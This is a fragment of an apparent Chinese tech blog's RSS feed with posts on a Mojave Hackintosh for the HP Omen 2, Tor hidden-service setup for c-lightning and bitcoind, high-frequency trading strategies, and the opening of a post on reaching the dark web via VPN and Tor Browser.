 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div id="content_views" class="markdown_views prism-tomorrow-night">
  <!-- flowchart 箭头图标 勿删 --><br />
  <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
   <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
  </svg> </p>
<div class="toc">
<h3>惠普暗影精灵2 Mojave</h3>
<ul>
<ul>
<li><a href="#_4" rel="nofollow" data-token="a3782db1502482c86acf8f923fa922b6">新的改变</a></li>
<li><a href="#BUG_20" rel="nofollow" data-token="94e2ad87821a35405363b107f17e85c1">已知BUG</a></li>
<li><a href="#font_colorredBugfont_25" rel="nofollow" data-token="0f25d65cb144b5f42b44c5bf5f60d336"><font color="red">Bug修复</font></a></li>
<ul>
<li><a href="#font_colorred__1__26" rel="nofollow" data-token="5dc52603b2404078ab1c27630215d1c1"><font color="red"> 1. 电池修复</font></a></li>
<li><a href="#font_colorred__2__27" rel="nofollow" data-token="e3b39a244948d44a2de931f98a64a51c"><font color="red"> 2. 亮度调节修复正常</font></a></li>
</ul>
<li><a href="#Mac_osMojave_29" rel="nofollow" data-token="b614eeca500beb7adbde5358ac691929">**Mac os（Mojave）的镜像百度即可！**</a></li>
<li><a href="#Github_31" rel="nofollow" data-token="2590baa7d18f3bd18ca2f03b642a9591">Github开源地址</a></li>
</ul>
<li><a href="#_Mojave_2httpsgithubcomArecallMacos_33" rel="nofollow" data-token="4ac609e7a1e233aeacbe2272a0e587b3">====传送地址: [Mojave 暗影精灵2](https://github.com/Arecall/-Mac-os).====</a></li>
</ul></div>
</p>
<h2><a id="_4"></a>新的改变</h2>
<p>2018年6月5日，在2018苹果全球开发者大会上，苹果发布了mac OS Mojave系统。</p>
<ol>
<li><strong>夜间模式</strong> ，MacOS Mojave的夜间模式，不仅使UI变暗，<br /> 还切换壁纸，窗口边框和窗口内容，此外，XCode同样也支持夜间模式。用户可以自行设置夜晚模式，也可以由系统决定随时间自动启动。</li>
<li><strong>桌面堆积</strong>，可以通过类型、日期、标签等进行分类，侧栏底部的新快速操作，可快速执行旋转图像等操作。几乎可以在任何文件视图中使用侧边栏。如果选择多个文件，它可以对所有文件执行操作，例如将它们组装成PDF。</li>
<li><strong>画廊视图（Gallery View）</strong>，可预览图片、视频、PPT、表格、PDF等，侧边栏支持完整元数据，右下角增加快捷工具栏可执行旋转等操作，侧边栏可以在几乎任何文件视图中使用，选择多个文件后可以执行整体操作如生成PDF。</li>
<li><strong>截屏</strong>，功能非常丰富，就像在iOS上截图时角落里会出现大拇指图标，点击就会出现快速标记工具。</li>
<li><strong>iOS应用登陆桌面</strong> ，Apple News苹果新闻、Stock股票、Voice Memos语音备忘录、Home家庭都会来到macOS，基本上可以视为iPad版本，为此苹果从iOS上移植过来了一些关键框架。</li>
<li><strong>HomeKit</strong>，可以在Mac上添加和管理HomeKit设备，依然支持Siri语音控制。</li>
<li><strong>Quick Look</strong>，加入Markup，可以直接把签名拖拽到文档内。</li>
<li><strong>Continuity Camera</strong>，可以直接将iPhone里已有或者拍摄的照片直接导入桌面文档，还可以扫描手机上的文档并发送结果。</li>
<li><strong>安全和隐私</strong>，任何应用都默认受到保护。Safari减少对用户数据的追踪。网页信息追踪保护默认关闭。加强硬件指纹识别安全等级（iOS 12/macOS Mojave同步）。</li>
<li><strong>应用商店</strong>，界面重新设计像iOS商店看齐，增加新的分类包括发现、创建、工作、游戏、开发、分类、更新，增加关于应用的故事（Stories）。<br /> <img src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190703162017144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXJpc2gxNTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190703161724203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXJpc2gxNTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190703161739877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXJpc2gxNTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190703161750551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXJpc2gxNTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h2><a id="BUG_20"></a>已知BUG</h2>
<ol>
<li><strong>WIFI模块不可用</strong><br /> <font color="#e4393c"> <s>2. 电池DDST有问题，未修复</s><br /> <s>3. 亮度调节需要外接键盘，使用<kbd>Fn</kbd>+亮度调节经行第一次矫正，以后直接使用后电脑键盘de<kbd>Fn</kbd>+亮度调节。</s></font></li>
</ol>
<h2><a id="font_colorredBugfont_25"></a><font color="red">Bug修复</font></h2>
<h3><a id="font_colorred__1__26"></a><font color="red"> 1. 电池修复</font></h3>
<h3><a id="font_colorred__2__27"></a><font color="red"> 2. 亮度调节修复正常</font></h3>
<h2><a id="Mac_osMojave_29"></a><strong>Mac os（Mojave）的镜像百度即可！</strong></h2>
<h2><a id="Github_31"></a>Github开源地址</h2>
<h1><a id="_Mojave_2httpsgithubcomArecallMacos_33"></a><mark><mark>传送地址: <a href="https://github.com/Arecall/-Mac-os" rel="nofollow" data-token="781aa5d443929d3bfe4ffc82ae62ed21">Mojave 暗影精灵2</a>.</mark></mark></h1>
</p></div>
<link href="https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-526ced5128.css" rel="stylesheet">
</div>
]]></content:encoded>
										</item>
		<item>
		<title>c-lightning 闪电网络配置洋葱服务（tor）</title>
		<link>https://uzzz.org/article/1123.html</link>
				<pubDate>Thu, 28 Mar 2019 10:51:28 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1123.html</guid>
				<description><![CDATA[我只是在5.2方式下做了验证 我的系统：Linux vbtc 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 1、安装tor及配置参照 《tor隐藏服务配置(比特币).txt》 2、为持久的.onion地址创建隐藏服务（tor2） &#160;&#160; &#160;/etc/tor/torrc文件中添加以下行： &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; HiddenServiceDir /var/lib/tor/lightningd-service_v2/ &#160;&#160; &#160; &#160; &#160; &#160;HiddenServicePort 1234 127.0.0.1:9735 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; 保存文件并重新启动Tor服务：/etc/init.d/tor restart &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; 可以在/var/lib/tor/var/lib/tor/lightningd-service_v2/hostname找到新创建的地址 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;注意： &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;版本2洋葱地址在Tor服务重新启动时保持不变。它是在您创建Tor隐藏服务时创建的。 3、查看外部地址： &#160; &#160; &#160; &#160; &#160; &#160; &#160; curl ipinfo.io/ip 4、查看内部地址 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;ip route get 1 &#124; awk &#8216;{print $NF;exit}&#8217; 5、c-lightning参数配置（5.1或5.2）： &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;5.1 、（服务器上配置）c-lightning具有公共IP地址和固定的Tor隐藏服务地址，该地址是持久的，因此外部用户可以连接到该节点。参数 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;&#160;&#160; &#160;&#160;&#160; &#160;&#8211;bind-addr=yourInternalIPAddress:port &#8211;announce-addr=yourexternalIPAddress:port &#8211;announce-addr=your.onionAddress:port`&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; 注意： &#160;&#160; &#160;&#160;&#160; &#160; your.onionAddress是使用Tor隐藏服务创建的（见上文）。端口是指示为隐藏服务端口的端口。如果隐藏的服务创建行是HiddenServicePort 1234 127.0.0.1:9735.onion地址，则可以在1234端口（全局端口）访问。 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;通过以下方式连接到此节点：lightning-cli connect nodeID .onionAddress globalPort &#160; 或 &#160;lightning-cli connect nodeID yourexternalIPAddress Port &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;5.2、 （本地个人开发环境）c-lightning没有公共IP地址，但有一个固定的Tor隐藏服务地址是持久的。参数： &#160;&#160;]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<p>我只是在5.2方式下做了验证<br /> 我的系统：Linux vbtc 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</p>
<p>1、安装tor及配置参照 《tor隐藏服务配置(比特币).txt》<br /> 2、为持久的.onion地址创建隐藏服务（tor2）<br /> &nbsp;&nbsp; &nbsp;/etc/tor/torrc文件中添加以下行：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; HiddenServiceDir /var/lib/tor/lightningd-service_v2/<br /> &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;HiddenServicePort 1234 127.0.0.1:9735<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 保存文件并重新启动Tor服务：/etc/init.d/tor restart<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 可以在/var/lib/tor/var/lib/tor/lightningd-service_v2/hostname找到新创建的地址<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;注意：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;版本2洋葱地址在Tor服务重新启动时保持不变。它是在您创建Tor隐藏服务时创建的。<br /> 3、查看外部地址：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; curl ipinfo.io/ip<br /> 4、查看内部地址<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ip route get 1 | awk &#8216;{print $NF;exit}&#8217;<br /> 5、c-lightning参数配置（5.1或5.2）：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;5.1 、（服务器上配置）c-lightning具有公共IP地址和固定的Tor隐藏服务地址，该地址是持久的，因此外部用户可以连接到该节点。参数<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#8211;bind-addr=yourInternalIPAddress:port &#8211;announce-addr=yourexternalIPAddress:port &#8211;announce-addr=your.onionAddress:port`&nbsp;</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 注意：<br /> &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; your.onionAddress是使用Tor隐藏服务创建的（见上文）。端口是指示为隐藏服务端口的端口。如果隐藏的服务创建行是HiddenServicePort 1234 127.0.0.1:9735.onion地址，则可以在1234端口（全局端口）访问。<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;通过以下方式连接到此节点：lightning-cli connect nodeID .onionAddress globalPort &nbsp; 或 &nbsp;lightning-cli connect nodeID yourexternalIPAddress Port</p>
<p> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;5.2、 （本地个人开发环境）c-lightning没有公共IP地址，但有一个固定的Tor隐藏服务地址是持久的。参数：<br /> &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#8211;bind-addr=yourInternalIPAddress:port &#8211;announce-addr=your.onionAddress:port<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 验证：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;lightning-cli getinfo 可以看到 .onion地址<br /> &nbsp;<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 5.3、 通过指定，节点可以通过IPV4 / 6 socks 5代理连接到任何V4 / 6 IP地址 ：<br /> &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&#8211;proxy=127.0.0.1:9050 &#8211;always-use-proxy</p>
<p>参照：<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;https://en.bitcoin.it/wiki/Setting_up_a_Tor_hidden_service<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;https://github.com/ElementsProject/lightning/blob/master/doc/TOR.md<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;lightning-cli &nbsp;-help</p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>比特币配置洋葱tor服务</title>
		<link>https://uzzz.org/article/1088.html</link>
				<pubDate>Thu, 28 Mar 2019 10:49:57 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1088.html</guid>
				<description><![CDATA[注意权限问题，我就是在本地很快成功（root用户），在服务其上用的其它用户（权限问题），因为权限问题折腾了好几个小时╭( T □ T )╮ 我是在服务器和我本地环境都做了验证 1、下载tor(2)，目前比特币不支持tor3 &#160; &#160; &#160; &#160; sudo apt-get install tor 2、配置/etc/tor/torrc &#160; &#160; &#160; &#160;&#160; &#160;ControlPort 9051 &#160; &#160; &#160; &#160;&#160; &#160;CookieAuthentication 1 &#160; &#160; &#160; &#160;&#160; &#160;CookieAuthFileGroupReadable 1 3 查看bitcoind运行的用户和组信息 &#160; &#160; &#160;&#160;&#160; &#160;ps -eo user,group,comm &#124; grep &#160;bitcoind &#160;这个就可以了 4 添加bitcoind的用户到组中 &#160; &#160; &#160;&#160; &#160;sudo usermod -a -G BITCOIN_GROUP BITCOIN_USER 5、配置bitcoin.conf &#160; &#160; &#160;&#160; &#160;proxy=127.0.0.1:9050 &#160;&#160; &#160;listen=1 &#160;&#160; &#160;bind=127.0.0.1 &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; onlynet=onion #设置比特币节点只连接到tor hidden services 6、重新启动tor &#160;&#160; &#160;/etc/ini.d/tor restart 7、重新启动bitcoind 成功标志： debug.log 中： tor: Got service ID XXXXXXXXXXX, advertising service XXXXXXXXXXX.onion:8333 或testnet3/regtest下有此文件（此文件删除会自动生成） onion_private_key&#160; 参照： &#160; &#160; https://en.bitcoin.it/wiki/Setting_up_a_Tor_hidden_service &#160;]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<p>注意权限问题，我就是在本地很快成功（root用户），在服务其上用的其它用户（权限问题），因为权限问题折腾了好几个小时╭( T □ T )╮<br /> 我是在服务器和我本地环境都做了验证</p>
<p>1、下载tor(2)，目前比特币不支持tor3<br /> &nbsp; &nbsp; &nbsp; &nbsp; sudo apt-get install tor<br /> 2、配置/etc/tor/torrc<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;ControlPort 9051<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;CookieAuthentication 1<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;CookieAuthFileGroupReadable 1</p>
<p>3 查看bitcoind运行的用户和组信息<br /> &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ps -eo user,group,comm | grep &nbsp;bitcoind &nbsp;这个就可以了<br /> 4 添加bitcoind的用户到组中<br /> &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;sudo usermod -a -G BITCOIN_GROUP BITCOIN_USER</p>
<p> 5、配置bitcoin.conf<br /> &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;proxy=127.0.0.1:9050<br /> &nbsp;&nbsp; &nbsp;listen=1<br /> &nbsp;&nbsp; &nbsp;bind=127.0.0.1<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; onlynet=onion #设置比特币节点只连接到tor hidden services<br /> 6、重新启动tor<br /> &nbsp;&nbsp; &nbsp;/etc/ini.d/tor restart</p>
<p>7、重新启动bitcoind</p>
<p>成功标志：<br /> debug.log 中：<br /> tor: Got service ID XXXXXXXXXXX, advertising service XXXXXXXXXXX.onion:8333</p>
<p>或testnet3/regtest下有此文件（此文件删除会自动生成）<br /> onion_private_key&nbsp;</p>
<p>参照：<br /> &nbsp; &nbsp; https://en.bitcoin.it/wiki/Setting_up_a_Tor_hidden_service<br /> &nbsp;</p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>高频交易（二）浅谈高频交易中比较成熟的一些交易策略</title>
		<link>https://uzzz.org/article/3173.html</link>
				<pubDate>Tue, 19 Feb 2019 08:19:10 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[区块链]]></category>
		<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/3173.html</guid>
				<description><![CDATA[今天我们谈谈高频交易中比较成熟的一些交易策略，应用于数字货币市场。 引言： 高频交易是自动化交易的一种形式，以速度见长，利用计算机系统加入人工智能算法，以智能化方式，快速，稳健的短线持仓执行交易。其中，国际金融领域比较流行的交易策略有： 1、市场微观结构交易策略； 2、统计套利策略； 3、事件交易策略； 4、流动性交易策略。 高频交易是量化投资领域，金融市场一颗璀璨的明星，是金融科技发展到一定程度的产物。更是国际金融炒家常用的金融工具。欧洲证券监管委员会给出这样的定义：高频交易是自动化交易的一种形式，以速度见长，它利用复杂的计算机技术和系统，以毫秒级的速度执行交易，并且日内短暂持仓。现在再加入人工智能方式，来创建合理的高频交易模型。 高频交易都有哪些关键特征： 1、处理分笔交易数据和算法交易 处理分笔交易数据和算法交易是高频交易的重要流程，高频交易通过对市场分笔交易数据进行采集、处理，分析市场在微观上潜在的交易机会，一旦确认交易机会，通过算法交易及时下单进场，获利后快速平仓离场的一种交易策略。 2、高资金周转率和日内交易 高资金周转率和日内交易也是高频交易的特点，交易过程中，资金快速进场出场，一秒钟内可以发生多次下单、撤单的动作。资金在整个交易过程中高速流转，提高了市场流动性。同时，日内交易也回避了隔夜风险。 国际金融市场有以下几种比较成熟的交易策略： 1、市场微观结构交易策略 市场微观结构交易策略主要是通过分析市场中即时的盘口数据，在短时间内，对选定的交易对，根据交易对买卖订单流不平衡原理进行短暂交易的策略。比如EOS当天涨幅12%，ETH涨幅3%，这样的策略在短时间就产生较大的套利空间。市场中即时的买卖订单流中潜藏着很多交易机会，通过系统统计可见的交易订单及其他参数变化，分析未来极短时间内是卖单流主导还是买单流主导。在卖单流主导的市场中，价格将下跌；在买单流主导的市场中，价格将上涨。根据市场变化进行操作。 利用市场微观结构交易策略，系统通过对比分析交易订单中买卖单量，抢先交易，并快速平仓。前提条件是需要获取真实的交易订单数据，防止干扰数据。因此这种交易策略还需要配合其他交易策略，交易参数一起分析，做出正确的分析判断。 这种交易策略应用比较广泛应用在期货交易市场，通过观察盘口信息，寻找机会，快速下单，快速平仓，高频交易，获利不小。 这种交易方式以速度见长，人工操作几乎很少，都是通过系统分析，快速操作完成。 2、统计套利策略 统计套利策略是寻找具有长期统计关系的交易对，根据长期的数据统计结果，在交易对价差发生偏差时进行套利的一种交易策略。这种交易策略也非常适合于数字货币交易市场。 3、事件交易策略 事件交易策略是指利用市场对事件的反应进行交易的策略。事件可以是影响广泛的经济事件，也可以是行业相关事件。每个事件对市场产生影响的时间差异很大，高频事件交易策略就是利用事件在极短时间内的影响自动进行交易，赚取利润。 该策略中有两个环节比较关键。 1）确定什么时间可以产生影响的事件。这就需要信息搜集部门配合，挖掘最近事件，及事件对市场的影响。快速反应。快速交易。 2）确定事件的影响时间和方向。这需要不断地对历史数据进行统计挖掘。 4、流动性交易策略 流动性交易策略是为市场提供流动性来获取利润的交易策略。做市商们为市场提供不同价位层次的订单，为头寸接受者提供流动性，因此被称为流动性交易策略。做市商为市场的流动性做出了贡献，很多非活跃市场由于做市商的存在，流动性显著提高，交易成本大为降低。 做市商策略的理论基础是存货模型与信息模型 1）买卖价差实际上是有组织的市场为交易的即时性提供的补偿。 2）买卖价差是由于市场信息不对称性造成的。 做市商们通过对订单统计分析、对波动性等市场微结构进行研究，提高了市场流动性，同时也从市场中获利。 总结： 不是一种交易策略都是万能的，往往在实际操作过程中，几种策略同时运用，取长补短，综合分析，在合适的时间点，选取合适的策略组合进行操作。这就需要计算机系统与人工智能综合运用起来。对统计数据不断分析，根据模型预警为操作者建议合适的交易策略。操作者再根据自己的经验，参考模型分析，理性的做出合理的判断。 2019年12月19日整理于深圳]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div id="content_views" class="markdown_views prism-tomorrow-night">
  <!-- flowchart 箭头图标 勿删 --><br />
  <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
   <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
  </svg> </p>
<p>今天我们谈谈高频交易中比较成熟的一些交易策略，应用于数字货币市场。</p>
<p><strong>引言：</strong><br /> 高频交易是自动化交易的一种形式，以速度见长，利用计算机系统加入人工智能算法，以智能化方式，快速，稳健的短线持仓执行交易。其中，国际金融领域比较流行的交易策略有：<br /> 1、市场微观结构交易策略；<br /> 2、统计套利策略；<br /> 3、事件交易策略；<br /> 4、流动性交易策略。</p>
<p>高频交易是量化投资领域，金融市场一颗璀璨的明星，是金融科技发展到一定程度的产物。更是国际金融炒家常用的金融工具。欧洲证券监管委员会给出这样的定义：高频交易是自动化交易的一种形式，以速度见长，它利用复杂的计算机技术和系统，以毫秒级的速度执行交易，并且日内短暂持仓。现在再加入人工智能方式，来创建合理的高频交易模型。</p>
<p>高频交易都有哪些关键特征：<br /> <strong>1、处理分笔交易数据和算法交易</strong><br /> 处理分笔交易数据和算法交易是高频交易的重要流程，高频交易通过对市场分笔交易数据进行采集、处理，分析市场在微观上潜在的交易机会，一旦确认交易机会，通过算法交易及时下单进场，获利后快速平仓离场的一种交易策略。<br /> <strong>2、高资金周转率和日内交易</strong><br /> 高资金周转率和日内交易也是高频交易的特点，交易过程中，资金快速进场出场，一秒钟内可以发生多次下单、撤单的动作。资金在整个交易过程中高速流转，提高了市场流动性。同时，日内交易也回避了隔夜风险。</p>
<p>国际金融市场有以下几种比较成熟的交易策略：<br /> <strong>1、市场微观结构交易策略</strong><br /> 市场微观结构交易策略主要是通过分析市场中即时的盘口数据，在短时间内，对选定的交易对，根据交易对买卖订单流不平衡原理进行短暂交易的策略。比如EOS当天涨幅12%，ETH涨幅3%，这样的策略在短时间就产生较大的套利空间。市场中即时的买卖订单流中潜藏着很多交易机会，通过系统统计可见的交易订单及其他参数变化，分析未来极短时间内是卖单流主导还是买单流主导。在卖单流主导的市场中，价格将下跌；在买单流主导的市场中，价格将上涨。根据市场变化进行操作。</p>
<p>利用市场微观结构交易策略，系统通过对比分析交易订单中买卖单量，抢先交易，并快速平仓。前提条件是需要获取真实的交易订单数据，防止干扰数据。因此这种交易策略还需要配合其他交易策略，交易参数一起分析，做出正确的分析判断。</p>
<p>这种交易策略应用比较广泛应用在期货交易市场，通过观察盘口信息，寻找机会，快速下单，快速平仓，高频交易，获利不小。</p>
<p>这种交易方式以速度见长，人工操作几乎很少，都是通过系统分析，快速操作完成。</p>
<p><strong>2、统计套利策略</strong><br /> 统计套利策略是寻找具有长期统计关系的交易对，根据长期的数据统计结果，在交易对价差发生偏差时进行套利的一种交易策略。这种交易策略也非常适合于数字货币交易市场。</p>
<p><strong>3、事件交易策略</strong><br /> 事件交易策略是指利用市场对事件的反应进行交易的策略。事件可以是影响广泛的经济事件，也可以是行业相关事件。每个事件对市场产生影响的时间差异很大，高频事件交易策略就是利用事件在极短时间内的影响自动进行交易，赚取利润。</p>
<p>该策略中有两个环节比较关键。<br /> 1）确定什么时间可以产生影响的事件。这就需要信息搜集部门配合，挖掘最近事件，及事件对市场的影响。快速反应。快速交易。<br /> 2）确定事件的影响时间和方向。这需要不断地对历史数据进行统计挖掘。</p>
<p><strong>4、流动性交易策略</strong><br /> 流动性交易策略是为市场提供流动性来获取利润的交易策略。做市商们为市场提供不同价位层次的订单，为头寸接受者提供流动性，因此被称为流动性交易策略。做市商为市场的流动性做出了贡献，很多非活跃市场由于做市商的存在，流动性显著提高，交易成本大为降低。</p>
<p>做市商策略的理论基础是存货模型与信息模型<br /> 1）买卖价差实际上是有组织的市场为交易的即时性提供的补偿。<br /> 2）买卖价差是由于市场信息不对称性造成的。<br /> 做市商们通过对订单统计分析、对波动性等市场微结构进行研究，提高了市场流动性，同时也从市场中获利。</p>
<p><strong>总结：</strong><br /> 不是一种交易策略都是万能的，往往在实际操作过程中，几种策略同时运用，取长补短，综合分析，在合适的时间点，选取合适的策略组合进行操作。这就需要计算机系统与人工智能综合运用起来。对统计数据不断分析，根据模型预警为操作者建议合适的交易策略。操作者再根据自己的经验，参考模型分析，理性的做出合理的判断。</p>
<p>2019年12月19日整理于深圳</p>
</p></div>
<link href="https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-526ced5128.css" rel="stylesheet">
</div>
]]></content:encoded>
										</item>
		<item>
		<title>隐藏网，怎么进入深网</title>
		<link>https://uzzz.org/article/782.html</link>
				<pubDate>Tue, 04 Dec 2018 07:34:01 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/782.html</guid>
				<description><![CDATA[an网（不可见网，隐藏网）是指那些储存在网络数据库里、不能通过超链接访问而需要通过动态网页技术访问的资源集合，不属于那些可以被标准搜索引擎索引的表面网络。最近没啥事，对暗网一直是久闻其名，这不正好好奇进去看看，毕竟有的时候越是朦胧越好奇，真正进去了才发现也就那样。 我总结了下，进入暗网首先要三步： 1.首先要有VPN，国内的墙厉害，不翻墙是进不去暗网的，我这边用的一个叫魔法集中营的翻墙软件，20块钱一个月，其实这种翻墙的VPN自己搭建也行，只需要有墙外的服务器资源，比方说阿里云，能够翻墙之后，连接youtube。 2.其次要有Tor Browser浏览器，国内称洋葱浏览器，是为了无痕处理，毕竟法外之境，需要无痕处理等，打开Tor Browser 点击连接，进入此页面。 连接成功后和正常浏览器一般使用即可 3.第三步，你需要了解暗网的地址，暗网中的大部分网站都是以onion为后缀名的网站，当然也有些像not Evil的搜索网站，但不太会用，暗网毕竟是法外之地，色情暴力血腥都是赤裸裸的，这边只是介绍一下让人知道，能不进去还是别进了，心向大海，春暖花开。 &#160; 完成以上三步就可以进入暗网了 &#160;]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<p>an网（不可见网，隐藏网）是指那些储存在网络数据库里、不能通过<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE%E6%8E%A5" rel="nofollow" data-token="b40a638d009fd8d36b04ac83a3c53932">超链接</a>访问而需要通过动态网页技术访问的资源集合，不属于那些可以被标准搜索引擎索引的表面网络。最近没啥事，对暗网一直是久闻其名，这不正好好奇进去看看，毕竟有的时候越是朦胧越好奇，真正进去了才发现也就那样。</p>
<p>我总结了下，进入暗网首先要三步：</p>
